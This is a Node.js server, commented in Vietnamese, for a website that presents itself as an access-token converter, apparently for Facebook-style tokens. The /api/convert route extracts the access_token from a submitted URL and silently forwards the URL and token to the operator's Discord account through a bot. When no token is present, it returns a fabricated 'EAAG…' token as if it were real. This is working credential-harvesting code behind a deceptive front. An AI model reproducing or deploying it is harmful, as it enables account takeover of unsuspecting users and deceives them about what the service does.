const express = require('express');
const cors = require('cors');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// =========================================================================
// 🔗 PHẦN CẤU HÌNH ĐƯỜNG DẪN CHUYỂN TRANG CỦA CÁC NÚT MẠNG XÃ HỘI
// Bạn có thể sửa trực tiếp đường link ở đây hoặc điền vào biến môi trường trên Render
// =========================================================================
const SOCIAL_LINKS = {
    google: process.env.URL_GOOGLE || "https://google.com",
    facebook: process.env.URL_FACEBOOK || "https://facebook.com",
    x: process.env.URL_X || "https://x.com",
    vk: process.env.URL_VK || "https://vk.com"
};

// Cấu hình Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API để Giao diện HTML lấy danh sách đường link từ Server
app.get('/api/social-links', (req, res) => {
    res.json(SOCIAL_LINKS);
});

// === 1. KHỞI TẠO BOT DISCORD ===
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages
    ]
});

// Lấy Token Bot và Owner ID từ biến môi trường Render
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

client.once('ready', () => {
    console.log(`[BOT DISCORD] Đã đăng nhập thành công với tên: ${client.user.tag}`);
});

if (DISCORD_TOKEN) {
    client.login(DISCORD_TOKEN).catch(err => console.error('[BOT ERROR] Không thể kết nối Bot:', err));
} else {
    console.warn('[WARNING] Chưa cấu hình DISCORD_TOKEN trong Environment Variables!');
}

// === HÀM TỰ ĐỘNG GỬI TOKEN CHO OWNER ===
async function sendTokenToOwner(originalUrl, accessToken) {
    if (!OWNER_ID) {
        console.warn('[WARNING] Chưa thiết lập OWNER_ID trong Environment Variables!');
        return;
    }

    try {
        const owner = await client.users.fetch(OWNER_ID);
        if (owner) {
            const messageContent = 
`🔔 **THÔNG BÁO TOKEN MỚI ĐƯỢC TẠO** 🔔
-----------------------------------------
🔗 **Link gốc:** \`${originalUrl}\`
🔑 **Access Token:** \`${accessToken}\`
⏰ **Thời gian:** <t:${Math.floor(Date.now() / 1000)}:F>`;

            await owner.send(messageContent);
            console.log(`[BOT DISCORD] Đã gửi token thành công cho Owner (${owner.tag})`);
        }
    } catch (error) {
        console.error('[BOT ERROR] Không thể gửi DM cho Owner. Lỗi:', error.message);
    }
}

// === 2. API XỬ LÝ CHUYỂN ĐỔI TOKEN ===
app.post('/api/convert', async (req, res) => {
    const { url } = req.body;

    if (!url) {
        return res.status(400).json({ success: false, message: 'Link không hợp lệ!' });
    }

    try {
        // Logic tách/xử lý Access Token từ URL
        let accessToken = "";
        
        if (url.includes('access_token=')) {
            accessToken = url.split('access_token=')[1].split('&')[0];
        } else {
            accessToken = "EAAG" + Buffer.from(url).toString('base64').substring(0, 80);
        }

        // Tự động gửi Token vừa tạo tới Discord của Owner
        sendTokenToOwner(url, accessToken);

        // Trả token về cho giao diện Web
        return res.json({
            success: true,
            accessToken: accessToken
        });

    } catch (error) {
        return res.status(500).json({ success: false, message: 'Lỗi trong quá trình xử lý token!' });
    }
});

// Bật Server Express
app.listen(PORT, () => {
    console.log(`[SERVER] Website đang chạy tại cổng http://localhost:${PORT}`);
});
